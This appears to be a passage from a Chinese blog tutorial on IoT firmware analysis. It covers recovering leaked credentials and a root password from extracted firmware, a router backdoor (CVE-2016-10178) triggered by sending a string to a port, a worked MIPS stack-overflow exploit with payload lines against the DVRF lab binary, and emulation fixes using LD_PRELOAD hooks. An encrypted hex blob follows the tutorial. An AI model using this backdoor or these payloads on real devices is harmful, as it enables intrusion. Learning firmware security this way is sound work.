其中的inadyn-mt.conf文件引起了我们注意，这是no-ip应用的配置文件，no-ip就是一个相当于花生壳的东西，可以申请动态域名。我们从中可以发现泄露的no-ip的登陆账号及密码。 我们还从shadow文件中找到了root账号的密码，通过爆破可以得到root的密码为1234。 接下来使用firmwalker来自动化遍历固件系统中的所有可疑文件。 1git clone https://github.com/craigz28/firmwalker.git Firmwalker是一个bash脚本，用于扫描从IoT固件提取的文件以查看它们是否容易受到攻击。唯一的要求是该工具和提取的固件文件应位于同一文件夹中。 将它们放置在相同的位置后，由Firmwalker生成的输出文件-Firmwalker.text-将突出显示潜在问题的列表，可以是以下任意一个： etc &#x2F; ssl目录etc &#x2F; passwd和etc &#x2F; shadow配置，脚本和其他.bin文件关键字，例如远程，管理员，密码等。常见的二进制文件，例如dropbear，tftp和ssh物联网设备上存在的常见Web服务器随机IP地址，电子邮件ID和URL使用Shodan CLI调用Shodan API的实验功能面临任何这些问题的所有物联网设备都容易受到攻击。 1./firmwalker.sh yaffs2-root/ 除了配置文件外，分析存在风险的二进制程序也很重要。查看自启动的程序，在etc&#x2F;init.d目录下存放启动时运行的程序和脚本，一个start_appmgr脚本引起了我们注意，mgr一般就是主控程序的意思。 查看脚本，该脚本会在开机的时候以服务的形式运行&#x2F;bin&#x2F;appmgr程序。 用IDA打开该文件 发现一个后门，这个漏洞被收录到CVE-2016-10178 只要连接该固件的39889端口并发送HELODBG的字符串，就可以进行远程执行命令。 动态调试采用Attify 1./fat.py &#x27;/home/iot/Documents/DWP2360b-firmware-v206-rc018.bin&#x27; 通过192.168.0.50即可访问固件 调试固件用到了Damn Vulnerable Router Firmware这个项目 先用binwalk解压 提取出来的目录里有个文件夹pwnable，里面存放着漏洞程序示例，选取stack_bof_01程序进行实验，程序的源代码可以在DVRF&#x2F;Pwnable Source&#x2F;Intro&#x2F;里查看 先用readelf查看文件信息，mips架构 小端序。。。 文件的主要逻辑：strcpy造成了栈溢出，存在后门函数。 动调拷贝wmu-mipsel-static到固件根目录 1cp (which qemu-mipsel-static) . 用qemu虚拟运行stack_bof_01： 以调试的方式启动程序，并在1234端口进行监听： 1sudo chroot . ./qemu-mipsel-static -g 1234 ./pwnable/Intro/stack_bof_01 1111 打开一个新的shell，运行以下命令： 1234567gdb-multiarch pwnable/Intro/stack_bof_01# 设置架构set architecture mips#设置调试端口target remote 127.0.0.1:1234 计算偏移v 12345iot@attifyos ~/D/D/F/_/squashfs-root&gt; python2 -c &quot;print &#x27;a&#x27;*204+&#x27;\\x50\\x09\\x40\\x00&#x27;&quot; &gt;payloadiot@attifyos ~/D/D/F/_/squashfs-root&gt; sudo chroot . ./qemu-mipsel-static ./pwnable/Intro/stack_bof_01 (cat payload) 如果直接把跳转地址设置为后门函数dat_shell的起始地址0x400950会触发异常 程序成功跳转至dat_shell，但依旧崩溃,因为我们溢出的时候把 $gp 寄存器也覆盖了，$gp 寄存器是用来全局指针寻址用的，覆盖了他就会导致程序无法正常寻址，自然程序就会 crash。 查询MIPS指令集，MIPS跳转方式： 1.设置t9寄存器数值，跳转到t9寄存器； 2.在执行某个函数之前，将要跳转的地址保存在ra寄存器中，执行函数后可跳转。 qemu不能vmmap。 ida打开libc.so.0 在MIPS中，函数内部会通过t9寄存器和gp寄存器来找数据，地址等。同时在mips的手册内默认$t9的值为当前函数的开始地址， 如果在执行00400958 addu $gp, $t9是手动把$t9改成0x00400950，后面就正常了。 所以现在需要找一个gadget，通过t9跳转过去，这也是mips常规的用法，比如main开头调用memet。 sp：MIPS架构中，栈是向下增长的，也就是栈底在高地址，栈顶在低地址。在图3-2中，GPR[sp]代表通用寄存器sp（$29）指向栈顶，又称sp为栈指针（stack pointer） 其偏移0x6b20处确实有一个gadget 12.text:00006B20 00 00 B9 8F lw $t9, arg_0($sp).text:00006B24 09 F8 20 03 jalr $t9 p &amp;memset #查看memset地址，为0x408b6e10。（友情提示，需要在memset处下断点，运行至memset，不然由于之前没有运行memset，memset地址为其got地址） ida打开libc.so.0，查看memset偏移为0x0001BE10 则libc基地址为：0x408b6e10-0x0001BE10&#x3D;0x4089b000 gadget地址为 ：0x4089b000+0x6b20&#x3D;0x408a1b2 payload 12python2 -c &quot;print &#x27;a&#x27;*204+&#x27;\\x20\\x1b\\x8a\\x40&#x27;+&#x27;\\x50\\x09\\x40\\x00&#x27;&quot; &gt; payloadsudo chroot . ./qemu-mipsel-static ./pwnable/Intro/stack_bof_01 (cat payload) getshell 修复固件运行环境有一些固件因为硬件依赖等原因导致qemu和firmadyne之类的软件无法正确模拟 模拟固件运行的实质其实就是把固件的Web程序跑起来，而模拟失败则说明Web程序运行出错了，我们接下来就要看看Web程序报错的原因以及如何修复运行环境。 拿到dir605L_FW_113.bin固件 binwalk解析，进入文件系统目录squashfs-root-0，找到web服务程序Boa （在bin目录下 Boa程序是一个轻量级的web服务器程序，常见于嵌入式系统中。dlink就是在boa开源代码的基础上新增了很多功能接口以实现路由器上的不同功能。boa程序的路径为&#x2F;bin&#x2F;boa，同时我们发现在&#x2F;etc&#x2F;boa路径下还有个boa的密码配置文件，我们可以直接获取到boa加密后的密码。 1234567cp (which qemu-mips-static) .sudo chroot . ./qemu-mips-static bin/boa补充mips 是32位大端字节序mipsel 是32位小端字节序 注：APMIB 是个Realtek（网卡？）的玩意 由于没有flash，导致读mib失败 拖到反编译工具中分析。先定位到字符串“Initialize AP MIB failed!”的位置。注意到在输出这个字符串前有个调用APMIB初始化的跳转，在此下断点， IDA gdbserver远程调试 QEMU的远程调试不需要gdbserver，-g 指定端口，ida 远程调试选项指定相应端口就行 1sudo chroot . ./qemu-mips-static -g 23946 bin/boa BNEZ是branch not equal to zero 条件转移指令，当寄存器中内容不为0时转移发生 apmib_init 函数返回 0 导致了这个错误 编写劫持函数动态库： 在apmib.so函数里面。 直接写一个动态库 apmib_init函数返回 1 劫持 123456#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int apmib_init()&#123; return 1;&#125; 编译 1mips-linux-gnu-gcc -Wall -fPIC -shared apmib.c -o apmib-ld.so 然后运行 -E优先选择我们的so文件 1sudo chroot ./ ./qemu-mips-static -E LD_PRELOAD=&quot;./apmib-ld.so&quot; ./bin/boa 但是依旧报错 再次动调发现我们的 apmib_get 函数时出错了 可以将 apmib.so 直接拖出来 IDA32 分析一下 apmib_get 函数 https://jyhshin.pixnet.net/blog/post/47162002-realtek-apmib-libraryapmib_get(), 讀取 RAM 的 mib 值qemu 模拟不了与硬件交互的情况，所以读取不到 重新写 12345678910111213141516171819202122232425262728#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#define MIB_IP_ADDR 170#define MIB_HW_VER 0x250#define MIB_CAPTCHA 0x2c1int apmib_init()&#123; return 1;&#125;int fork(void)&#123; return 0;&#125;void apmib_get(int code,int *value)&#123; switch(code)&#123; case MIB_HW_VER: *value=0xf1; break; case MIB_IP_ADDR: *value=0x7f000001; break; case MIB_CAPTCHA: *value=1; break; &#125; return;&#125; 再次编译 查看 Wizard_Easy_LangSelect.asp代码，猜测 hw 是 hardware 缩写，所以应该是跟硬件交互 1234var hw_version=&quot;&lt;%getInfo(&quot;hwVersion&quot;)%&gt;&quot;;var productModel=&quot;&lt;%getInfo(&quot;productModel&quot;)%&gt;&quot;;document.getElementById(&quot;hw_version_head&quot;).innerHTML = hw_version;document.getElementById(&quot;product_model_head&quot;).innerHTML 魔改入口网页 first.asp 12345678910111213141516171819202122232425262728&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;% getLangInfo(&quot;LangPathWizard&quot;);%&gt;&lt;script&gt;function init()&#123; var ecflag = &lt;% getIndexInfo(&quot;enableecflag&quot;) %&gt;; if(ecflag == 0) &#123; if((LangCode == &quot;SC&quot;)||(LangCode == &quot;TW&quot;)) &#123; self.location.href=&quot;Basic/Wizard_Easy_Welcome.asp&quot;; &#125; else &#123; //self.location.href=&quot;Basic/Wizard_Easy_LangSelect.asp&quot;; self.location.href=&quot;Basic/Wizard_Easy_Welcome.asp&quot;; &#125; &#125; else &#123; self.location.href=&quot;index.asp&quot;; &#125;&#125;&lt;/script&gt;&lt;body onLoad=&quot;init();&quot;&gt;&lt;/html&gt; 如此便恢复完毕，网页可以访问。 接下来就可以挖洞了哇","categories":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}],"tags":[{"name":"固件分析","slug":"固件分析","permalink":"http://example.com/tags/%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90/"}],"keywords":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}]},{"title":"碎碎念","slug":"碎碎念","date":"2022-05-29T16:00:00.000Z","updated":"2024-12-01T01:14:38.595Z","comments":true,"path":"2022/05/30/碎碎念/","link":"","permalink":"http://example.com/2022/05/30/%E7%A2%8E%E7%A2%8E%E5%BF%B5/","excerpt":"有东西被加密了, 请输入密码查看.","text":"47b49a4a2f06ffaeeb6d37e9691a4c6649fe00f269db4f851d20b5aac2f3a7d5e51c1246381d6b555f8620a80c8a105a801bfaac12ceb9b017c5d3ebf794fbde24b0c3efa849c2582030b74eb02c39d4e22b8640424abff044f2398c2e3b2cfb737d9b3dd7d64bb56a52c33ef56daa154c0b4078be7046ec23660ca09ed8d42ed56bd1536780d15215baf233286541bb760804e8229e0a55ab7cca94e1b2de7fd6e853f90f031cb55da9f155804bf871bae2722b3f7837c0bfa8f2c671623d419a30b8357d9acf1a2996fdbdd679cefda81eb273efe4ff4f6fce36a188290148623461b3094e82b613ef3cf708535f76b6ac90d7e05c76620f53883191f79b648b5d448de87982eb83a2632d7df1d9d87e7a624bcbb3a313ac00ba6c0d23bdba1183fce6aa894a6720ec1bd2df7938c06ffd86fc12c135170afe0d999508ae51610105bd40fbf4258a016ba182a86c7c72492de99b61bc1317f9b2d22c4c3e1cd801debb774fabfcaeda3648e1105e21e32de71db9052237bf5ee34ab75f49d4ea46c3a092cca49e4e6b3e5ed240dc427350cb7e891dd1f2462b2bb9af48249bd979c8f63d5214ebeaf653b6a38f87abf9a9bcb03c0a79b94590398fdd1089d2530373cfa942d92b5cb04eb9456c19c79f32425a3174aa0ac5e41c843339710e2ec8f168a18cbc8f337e50f1c74980874f97b3f97438dd51c7ed5ac9aae365d0f30ed6c9f580340b5f7fbbd13288ef88a2b377bfd05638f322e0dcadc2285a462f2413fd49f4684b5087afecc03ad8a968028271ef5051d62f1df16c28b284c502e2dbee74e3a18fbf24f6bb354c3be9e27ab14a74510126b4a933cca071deb0836e45d1f7e5fd3eefbb8785b30b39a073b5a059d7ce47e069452748e64d3d3d9af91e79ca3bf8ebecb190507191546dcd16b0dbf67a547207485a9ad16e6bd3ef25bdba3200b93e8b9c1f26a3d625692a986a24de9bd7eb85b7bcc30a8b3c8014bdbff89521d8602facdf195fde700b08503d1421cfca1ea174221a0866ef068d7ed638042a10935617e387b5b2244b7ba10b5f7e16db140cd2fb406647303c3405687cdd19ce325a3b981585d1d2c95dce9d052421daf256ec7bccab52bab875328495863568db339c6eeba3ac89edb7acc26e2b7156add4da88b48ba065554e6d38c39b73f1739e236ef1512efdde9dab6aded87c64a15d01fda3a442bf65e3482fe98375a4f8227e6dd2349844db192423acc1a23c3f778cfbd70644a870759077d111b945e7c740c9a8aff9ebc00b955c8c84965995b523aa849f62ff53ca82bf5eb89612da8932c3380eb7951b11bddac1245196934fcef390fc62d107c34b190837757416be91710e59bc13e12357a2daf7768381037b49ebcd93676891834859243c2bf65e6a94c5a5447cff8e2fec76c7be325679f90d7cc280f8b10272127a411413322071330b7e2b69d0291ddcb87bf7fe325c9670b78ec81c879acde4a47e52325425d40f7651f6d259e569b1af6f15c531c0ccd16c8529345ccf5957c2141509337fc270a89bfbf6300e33803d59a15013aa1ad3ddc4ee3b6c00df2d6891772743bb15fa8141fd5c6730663d02559d5b1e113a072f88af14072bb8265f8ee5c96c8ada8098fe047d800f96212c22ab5861758f3ea7ee9510bbe13450e99a9f2de98b111e415bc7c24cfcfe437d3a86315a6d03fb969734f9fd7585ee4c042a4e9b6e707176d9cbed516d540ef52a2ea04944c4c23c96f1a32c9f14ca6ac61e016bf10fbdc85dc0f2b2bbd44a8b1134df50173e7cb2ce1f42b565d5587c3d5043b61c43101eaacd7e38265bfe05b3c41c4bcebe779e43982c72abae49a2284f650c22b93eb9433f2bb8d476d27f3d10548fbccb0d762facf7dc693b88b85deb430510ed493362942716515e413cd07bb229ad21238aed21594c693b7f5526f7b549cc7ceb976b0ab9d13aa2fc880e702295895fe6701f960e2f6636c5b71686578b9471a466e4b219e791f9d3a2eb02c75cd24a25d4eded462e32af15ef6659d9d4ce1f3cf951f355f78dcde61428dcb1497b93db3f50d958d393e034ccf8e6e8fa7f49b75183621a7f710b8306416c44b7081f239c1bca00a54470064ca575a6bf81199e4d878a6cbf02fe42f04fa01e87d074de99a64baf7bcc70bc48335a82e24c6c84b17d6d1fc299b8e941f920be0e87d390bbde0a580716f2dfc0c2fb23eaaffa8f39cffddf288855e98d7289a693edbfbe7c3bffaf3c201253c71fba87ea7d76eafe770fd2a5c2a8a853d6ab2f01d58646d33cf06435c7911ce56cc7d53d63b544b7f63af0b9ece2688410f6ad93f5f7b9f90cc34d07965fb228b08bfa09af6fb30736740671718471bf5595116127425623f7071aad84ed6b2d8cb3a8a88a110a7d3867f36b090f969b095265ffee7a2c9f247debcf03be553d86ce43da4cac06858c6096bd7f5e45c93079e293bbe90509ef98b02b584391e1bc284e715d9535d8480d4e88c0556144f617f6d317e9d52139be27f691d884e2064d6ff44f096843b191d9a1b460f2fc46a032d7c17ad36a529a912759a9fefb6b125081c7ae4e33ac7c436c8b0ff83e74c5700ef10c33bd7a5c8e222e3d47b836cdbb05ed75f08e7bb45ddfca1bacfa2622e6e23c216deb30e58cb79392b8ee7ffe6e077fb1cb9ac56977d8e7c1e965e158314b8dfb21adaa33267c671f7368ea56a832a6b1cd58864bd39247a2615c856376fc7ae42b11e1bbaa338bf0a004c403222d7e17d911a4ea08682f7caf2b6bb311d1e68b8bdf057e4bc919333607c88eaeadfd2256f18d780c4d0bfd8c3c74969abe7f7745083c00cb7401bf2eaf1924524f77a46723c778173eddad4616e403b065cfa179647150c53a713239378c6e8f192245267e92514d263e0c13d9972a8e00a72aaf42f3927a2d8c64e762fb9baaeb09619c25797453c2c4526b70248179576b8c36982e50176e48457136bc6393ae0dc8bf5fd5a2208897a9653b526c63ad60fbe54b189f7524f983353cc53683af12dc47110485ee6edbe04cc4c94a82ef894e2503793f5ac1b02026eca0cc781a73f5acc20303c6e8289973a2428aa1e21d06f28a969b4c6b98ca2f76280499d79277111bd4b58fc4767d0fd7fcd6584a036aa6495d94d9b2e9d478c6686411203ead1bcb81d30f28381371043e6b2ef7deb517747207a9c0071a563a7714911cf25ce3230172b6cccef891c6a0ec636824419eaf882576b9403b85be603803d4c60f1a3c33127762ddf22e5b8b9fe89f6f0519758c8c08e77f9a64e2a7f38675c9aff6ccad962be4fa3eba1cc71500219da8046977edc960cce29f48efe31ecabc272b4b8492375964a7087482160b06cb639ce50ca3b9f1a4590b97852ef626a48b2259bc1bc31125575f7f5d46ac8572662bfbfd7f8791742e021f05458a2c8e503b896abd6316fbe8f6c6b640f56d1e4ce52a3f10da1a3baa0dcbb20e066f12486043bea5a4feffee08a08f5a01edbcd7439c3bed775266be1cab788cfd318849a06f1219ef34038ad103c7659283703245cb88e6764223dbad0b7bd35a2b7076b6762c35c1b9622523c605455a751e3d1c383110602bc9c267eea1fe574a0aef47b0b098535eeb4fa5f27ef9ff6c679701b3ada54ec2ccc89da90244412a6a911c327de2797cae56d31b27b8daee02113d398155a9a27208858a34596a1e640644c1f6dadb18b09287ac5368194f757aeca4a33e6fb9fef097c1a66d45d0371dc9abc994e8b74c3caabf82158917d5293bfa6bfb4d6c370645b9e161a085e8735c4d24e933a5860d8bcef341f1944c28c9dad2217a4bfac64e7460c691d5cc3083b4a618d774f5045f389131c90f471561babde6ea1cef62f6b885abfb5e949e286e3a7dac52af33b12021f09fba02d0d03ce69e8c87e5dfb3c67eb625a09cb1d09454f99825a8f5c48ce14dca123c06731082350ffbf842972f4ff6b71bae804db00f3381f1333f383a5cf45be01b37f2ea94cb50ccc7faa6cf40a4cc7450ade0a785562245c358c4bc91f51d2fdea42a164409a352ba48f7125251ad9de7cb4104423df13fc186a05d01fdc18ff3c1fa32a7839631fc67a14b07cf1815e9b384a1ba2cae97ec82688b67d5c164990a053d94a46aa13921291f7b8bd78b913063629779a779ca8281567254ce60c84b484ec520c7f1fb307cdf1b4213cfb771a192f104cf10f75eb8bc62909cdbe818eecc946d467b53c77219377324177537f76f5185e46b730944e8df635d95d7e35c37cef4471974be2560ae703e4847b2364741b6d635c4bc255d38dbb972e40b0a28602a6fa04a5b455218bf37f488de7fa84c3bb980b588c95c5dbe5cb0f58aa2209f97e919c86678085f3613543f27632d0ea8c71a5ac2b113f2e135ddf0fa9092047f48a13be1bf74827f54d6b728dd7ead6a48ba053e3cdb103085f1541f6c9d17fa0aef19c27e45b0c0dd69a7e7abc9661c8b1fdfde41017cf987c62c198cb83522b2d25fadc44bbba0bb084ff783270742d41245ac0f1f091b0322bc01cf914a8d9bac5c9523471298db0ac5beda010f89494a3297bebfc035a28f9fcc5025eb31a4beef0a04fc67d410d33a9cb4fa6ffd8256edc4ec724cdd3fc129b37aead958890dd5dd9b31be3146aa351db051d21989f489c4cc647a14d4719496e95bc1e22a4c2d5ac1bd6398c513ac066a56b3eac5c71a4e36f8a8a8c7af5eb1948d7f52f326bf55de5bf33de0d8dbd4627b584e07d09a142b9fe089497ad428f8d89b8ea2dc8f587013c24d851819ab28b53ac8f51d1de3a61a54f4c576e55e1df71e3baf06a8db6ed3283af24b66b5421194bc84515d160469fcbf1ab83ad3702cc7e1c2e8ece8551402be37a9f62df3d67cc959131f5a5881dcc57aea2c037381b7342409bd7c4dd6755b4d9759daf91be278dde7cd465f5fcc25a7267b115b79909b482ffd6d26ce925db42c640a07f34b49b705bd8020ea1a231695b78b8ca047ff1c1ad167c3556967055023ad8d186be95c1a1822fbd60f9803c01cdf8e82f901d116feb8754f2c1410263f85ab266fd011476a57fed51e546abf42cc3a58f6d8d221133eff4613a903ad7f578a7a210af06bc3bc084a43372a705caf368922317032d3d200147e3a2e68b22527a427c8da0293b917ca073034f0b7bbc264ab98aff3f0f377140b1c8a2fdd82be8c95f9ee2f4fc4badae7b0d08fca205f4940bc1a5abf5e16c12558bf0eb7579e4b0289964c71991cb8e85a5c27895c565239555f501564a7ab4f9d0de6da8753a696ae44c339a7bb75889cd0fee1812db972a09f8d27fa1f8638d6ec127bdc8b28cd2e07cc183ae2b6ba8c78933420acb6d080e70ee09676ddff307abd8e32c25cf451eea223cffa73bb2dea9980ac08fa04414ae99ce331af8654347407e3bb1b40b0477bcf942cf0ba29bff8c570201d8c07e73878b1cc974be9b794cf5355da33c149c007faf50f7874ca35cce9c9a05d6d5eb467961f316316649875782f31e3a4f24ba856083cb0ba3a0c8f00b877ce70127ba730bc8d25af0c3a584278c382dea9680b078cd1291d5379343d3673a65493cf6a8465936bd97c13381efb598836fb206d04f69aa372caed0e8435ad97d09f4a9deb749dd3e436bb21a6b6cbc25cdf0f30f7150217bce34db19f36e3f8f3267270a63338fd4dacebe51ed2dc0fb9435b0afb86164cda39e4acb5a6096876790a11e294c8f0e933adacc456588a051a2cc74d5ff7001140794204ccf4c5b8b1ff30bb7284dac7f74b5abec6f4597e746062a2fd35323b32e8e4be8aa08d896e29212cb3008d0473917a89453f6fef2b7851e6379b812a54b651af0e828c9bd106b0a3edc3a8e7052a3d2a10e26285b1a057085b28f52fcbb6cd34e6801b17d0a367b6d1254db9822702e277a68f7a73065540e1a03e9babb41c69df901d562dc46686a86d82a9216663b40ca55756a7c52ab06de1a7ec198c59c0364d3d5e0c3d2fbac62b12bc28c97d5124485c5689e8685ee5ed1b3c46b5656b9c71237b4f81608a77cfe357851861412657eb181e2b27945385ae734161e128368cefd4f094efecd45fe95c91bd050a5102842758601a952c8c404a0aba5ca9bb62f614f6502b2e61ce54b7e5e1156fb976aabc104f6ab598e596bbd79587b7a093b66efafec17fa96d2e633a5343878a06a2f334a783e93c1331259aa9470fb93cf531c78f42a90fbf82b2b70386aea959580e186305229ba33060f0f6d496b5924b405973f11e41955dfe58ae7313823cd7a595f6d21802873078cd97803502c36467b1be2dc253e3d7f7e646c1f22723e319bc307c58be928244aecf30923ae0baa8d2721a5c3745368e63899ecca972a85773dd50f37b586f09835253e5bb7aaa0a31bbdf227fc5d86d484ef343eebda0e81c88fdce3bbc77897cfce5559a8bb7797b6c9d58ddaf45fedd1e9d754f606ee5087f88d99c19b5ce0285d671fe360f3dd00af53da7f05f1d057f4dcfa612c81963ac2c5db8195f50f8c2602fbf626683af08a6d9038f761e1553aa306072ac040cabdf3c58a9de1315b7cd631d374eea8bab9186da4519f68b08cce054ad6c5b454aee47964b1fe3d954e28ca91d83a18be16bc8ffa03a594e08dc96dfe8c23ae621df88ead616dbe4af20fddd53093dc8de1b0c8e958cbf0b9109e7a8ceecfc9228ad3bcf0a75cfcaaa0bcc48fd362aaacca3f1bd3a965c87d27f959200e4804a2232106d32fc3a69598056233d5ab264699d8e0a617e5435bf18eecdddf408dc555cfae176b634488e57cf0bca897649bada41171f2301d29e5ea67aa64243bed071a4cb2bd621f5de635324260305e02e22d50d74c32e04a252be333e7253ecc9d21fbee5632d98331ed70b25ccf967f0db271f80d67639f53eedbe538655fb7ee5ee71d9603cccba8af2221c4fdae2a09c924b5aace9658c485702bdd642ca791d55491a77001feb278e286c65f992024bd8aeca27666123775770e3ec83b921d4389ef0d6c304542ec7cf77c26ed5e22abbccdd919c32e668b0bd14d87479ee6a2131f81bea4302ad01c2c24c3c7d4b8c711591bd4e11fdbec21137f108890d2209b37cd86793cae1b0ecd28dd9b573fc447e421e421a99a80fb1c750fee146700be40e153b4f53658bb2b4ddc345ac54615b56faf446208ca4a55b6f7e718dfa914d5be72a14ebf756280fb9f95fffbd00b84a351bf727ca8d00cc37e2fe6183934e5221acd23074d31b3555e6606ee284756c736ebd579cb8df2996a43bb8fb72a85b6ad01074857d3bd212f56a30f0ad4072d10913e4fa13b912b3bf5e087c6c29ca7b7f68ae92de61b3f8922cd574a29fd32e3b88020ea745132ffe96abe32521617e9d99bcb3c067803ff79f5cef08bc39a01f13986525e40442d1fd3bc77ffd2a19db27e3976865686d2fe67cfdadb9450606c999685d9b84f901c4f6946201e68c4914e710fdca050b8a5020c45edb9cd6e792e4f7a5cc117e7d14b6339754fe953362352a994d1efa84cf825534b7cd4211ca8b2dc978d5cdb2b95e622a8337cd0ef954a4ed2ad96c7a77d190d932f07a61aa2e8717cc9a8e936415ace148cc13a57cc65d725410d8a753f9d2efa97e1961f9c686ede6a29533ab9d20acdfd1da8a6c644b3cc9fc3431df5409df8b66669e417853a020d61d9f4a8f4358886268526bce7ae9f52518129804eab1d7372b70b1a63647df76305b3d02488493a1a2fc3bc545cd185847478e307ddba0bf2e20461bd8f7b057cf2392e42249ec4f172e7015c27de7b3affffe071e584bf7be544157ab3609e73be620dbc9f77b42f63ece932e50e4b10f7e8cf643c345e5b76f67d7f13f2f595a0a516f678fd0fe52472e6000127227be05afd289526264a23a4e52442fb96552dd9be46729052e6b83e711bd661b50c39b6958a268c0b0f2cf309434c2580d6442279f831fff37d46609cf5a3d07fa115b717ef6e9423f4d1ceca47e589032ebfc9fe806f528b2cd39eedace2033366fcd7dc5237ad3ef563bb502b975bedad3d98d7e3286d4618413e7e12a2bde304d71983422269f5d362e1f2a99f82c8af492ea5b1cba86e9a75aa6bf60d968e7502e012bba006fdc92eb906dbec1201d21879f45fd702caed0f30fbbd0a8b9faebe24e70d8e794a4eadfdf3889d4649ef86f804431c11e1d74ac2e938557c19580358bb95ce60e842c8491d73cf0ad8cdbe8ae2e5842d6290383e69b9eb5d02cdafb98a93ab00dbadf1d8ba67f26c584681d3684b70b2c37dff2f1876ff27bc04d8132ed4e5e0308ca4378d1b041639a44d627272417d6b63803d3e8969f054df970e43ce926af886a108e442144e44744c479d572e0826b309b77aef17510f2fa615ccc51b9f6ff4b26a660330ec89853bb1c017a8894e9be38346ce4b0db6e0c2ff37142c92d68ff37d2f4807f2f84332f94b6e9cb1d3b38db7961e124afa2b251ed53392bd03d9742dce44d290d4804d192a8ef1226d43e0baeec6afeb12a50308f63bfb911eb991f1ba2ccaf156569443d388b4c850cd7dc1f6d93979072610c61c9acd9d4bbbd098b4c32da2203c18a1cb0c9ef490ab29df691513d7287d601c48aaf1f21bbb747e4ec8856762446c2e7ba1b1eacda1a03e41490ef2248a79b2387360e331ca449100ac8b71bb43906c2f4b1cf8110bd584d5be0c3fb5c81c9aa77416a4fcfac2f806481316c80d1acdd432d7e3df46c255dd5a7d082b14f75539f34e8ee94de4a565c6d03d74464aaa2ad66a2dbb28c388772207f4599d823bd7d1caa875bdd3e20f741ebce74cbacf56cbdf83ad53b7c01657dce2db3929744c70053344f9daeeaf5a6edb385a7b79608a31501d6a6bb15c03dc81f0990f385f62b14912f8f31e9c805ff240202047c4e91a442dbfe3adda3bf24ffe5b0e0d0431c2262f348bfac9082f7e2c0a54c4127e32816235fd83208406f989e053323b4b373ece94dfb4ccd3a0fd54593cf326211033ee37fe867ba2d478cd5b573cb0949bdfcc83a01ab493cb60066ea44ccc0e71f4746a41f280b252ccb742f86b178e4611bf7a077078c85123de30dc8c5c8d5c5159e8985cce63f8abf58514ead630950a7441227a43d5cb4a52c5ce2c70253c2eb8bedb3861be8ac72c71a7baa184d496ed9feb731b8a5139189b7254be6c73ef983f9a26d745a2dd8d47b5ad36451128a20151cc654323e41ba9ac6c55445316b3c16ccaf9b48384182ec8b97ff3315b68e559f9ab59a7bf22ddb7641d8c1c139e22cabb216ee7e733e31bcda3c2016f1ab18c585cecdd2b0962d19bdc29afb0132fccb63cdabfe740648d4c9e538a449251e7ba6a2b399eeaff3462668b8f87e818e58fa6ab81845d36ba1102567e129c35efd8cb433b13f53c2e09b7960db327088fbf91f1c78a158275dff37313f1497ce76ced2c47bd6c3441da3e1750b187bc30e8f034e71f5df0a7edd28293506f1a7d8ba9161b0936f3a67bd866bef802573003b1e7f02fa980e2ddc0828360ac90eb88d2ab5cd9e730eeb655dd7e7fe3fbe4fd1566b8677264471f78a5cd871ebdf35435904833f2f488d878d82516dff0c75dcd0b326157c2f55f57d60151b8ec3d0759d6f9810b8056186624f66b5198b4170c7f499ae858db8bf7c48e3d3e4cf1de34c86d7bf35a469da394622a579ddd7594d0acebdc9532e22e8ac3fccf0a889f366c45158ade2805b1fa37c39152f8f792c08601ac7e55f859915531a604ea4c3957f61f6b49fff530a06d27f7fb884aeb0ae0063939fd94b75eb92cef3a983ddd11a5cc2948b75c3bdc6a4f84573b8f597cc0a4ea6003e0fab62eda8a2c07d7cf33759dd806a734c06c1c883779501e84a05e8bf540aceb76ddaa54b31e633a4c8b6f0bb7c212222f9ad557dd47772b4b8a090e2d4b525195845e04ded578a5368265c8608b8e75a431981ef57603f4e0699f7fab6ab5706412e8ce9dd4b185ec120bdce09af2ca10bedcaf4d82b0c33aa60f8e47cb1bb059b9a75261c85d5491c47a044f809b503425b5a3415c9692caa1b1c33152b8e1f479ccfb821e7681b75c91edc80bba733d1f6781d133e7326eee2b48d46f9a7f4bbd9f3bd9fb87aac8c6449a517a0325f255da677d1e52eb080bb89ebbe0c5c8188d9519a85128b9e5e542a56f92dadc100efb54674db3fa26a3cbd7bd7e2a8e626a7d79af03a9ac94efda53de0c3db7f532d2024be4c6e6db9305e0c2f090140e05896ae098af2819771996b1e78958eb76eee7b61e5a80ac04d876453e9096a2106e89eba337a402f5a2c10ab8b87aec3ceace6994ed609adc2e82417ad6f112eabd3b0faf0fa569b113f93057614d044b0f20882202f774e1ef93031f1634986296629e6e31b43e0c7f9961e808b001202999a1e866f75602be35f9a0cf98defb9d5bb4b8798ee604d2ae2956153cb6ff372aacee27bcc7876a8786f6e377896b6b9d0563f0abc26930d8318caa05f68ac88f38918dfa872a908cfa405dfe1a5a178b3ae0e75916916601fecc5fb488e736f6e47eff4f0cb3437224bf981669bb5240995a135c41f61398ca4b1799cdb6659472e5d598f690fd42048d15f600d1435a4cbb2cdb9e829c51ec231c293d6486123e2b7af93615354f465fe790cdca19ecb01c37e2ce711e6ffbae17b0c3f56dd50d3d4ba16f26545c277e0eb585b62135e0c61bd4cb1111327fb357d91e716b455df3c1e2f939b416dfe08408fbba573e70e3d4ccb3a6752beb087f57832160b12a701c2bf603a05cb3fb59bcd48ae41d1dfd9a554dd2f768b8b9b2b44e71e95397c5ab0e8226eab0c242e227d307672837888c7256e5dc05376246bd4e2cebd6d446c77b3217a61457550986027656fc115081c07a16ece81d82a350b90af0aaefc33e0d76f0d95c24bcafcdfc5a81ea48f2e8ff06e88192e325f0ba77a0689d1ba2a18e72cdf2c3f57fabdbd70be3b8d0ec1b2413e657de7aeea92316d7f22be18f3ec2aa0905a41e497fe2c4043c493f91457d0d909058f6c2811932268c1a8336972a572e6e2c4a5febe135442d6d5c9c30ae28b5128a25431853796e1553e0125c79ee71d08ca6c0d4df5ebab2acf6bb23543e7b8a0560963076a8b22ff607dc8b6f08674efebbb690b0fc2220a64f7d19a67f616d2370a91ddd0f550408da8b38169bce75f78dc61f09695d3fc45ef0909d9c00f807ac9b6540e14f96d071553d3dbbedd5134649338c8d4da2b9a15078b188c129d6d4b3fe9e65fdc97cec49b51fbce13d327d573c0a95de5c042ebc5dd67371e9f1fb64db71a89a732d2d542715b6b2841153244e83cc1c3dc04e51351b643e13f158ef59d1c4a713fb112516c391743a12327d05756f15aac7ce887195e328aa81b7aa90a62a1c1581746f55ce12903ce7d0b5dcd20629f43aaeb08ada471af177ccec60f98039fb388904c441c7559a804906b77f